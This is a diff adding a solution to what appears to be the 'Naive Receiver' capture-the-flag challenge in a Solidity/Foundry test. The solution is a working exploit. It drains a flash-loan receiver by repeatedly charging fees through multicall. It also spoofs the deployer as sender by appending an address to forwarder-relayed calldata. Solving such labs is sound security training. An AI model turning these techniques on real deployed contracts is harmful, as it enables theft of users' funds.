@@ -73,12 +73,65 @@ contract NaiveReceiverChallenge is Test {
         );
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
-    function test_naiveReceiver() public checkSolvedByPlayer {
+    /*
+        The exploit works by using the Multicall contract to batch multiple flash loan requests into a single transaction.
+        By doing this, we can drain all the WETH from the receiver contract in just one transaction.
+        Since the receiver contract has a limited amount of WETH, we can repeatedly flash loan small amounts 
+        (0 WETH in this case) and pay the fee from its balance until it is drained. 
+    */
+     function test_naiveReceiver() public checkSolvedByPlayer {
+
+        // Prepare call data for 10 flash loans and 1 withdrawal
+        bytes[] memory callDatas = new bytes[](11);
         
+        // Encode flash loan calls -
+        for (uint i = 0; i < 10; i++) {
+            callDatas[i] = abi.encodeCall(
+            NaiveReceiverPool.flashLoan,
+            (receiver, address(weth), 0, "0x")
+            );
+        }
+
+        // Encode the withdrawal call to send all WETH to the recovery address       
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(
+            NaiveReceiverPool.withdraw,
+            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+            ),
+            bytes32(uint256(uint160(deployer)))
+        );
+
+        // Encode the multicall
+        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
+
+        // Create forwarder request
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            gasleft(),
+            forwarder.nonces(player),
+            multicallData,
+            1 days
+        );
+
+        // Hash the request
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+            "\x19\x01",
+            forwarder.domainSeparator(),
+            forwarder.getDataHash(request)
+            )
+        );
+
+        // Sign the request
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Execute the request
+        forwarder.execute(request, signature);
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
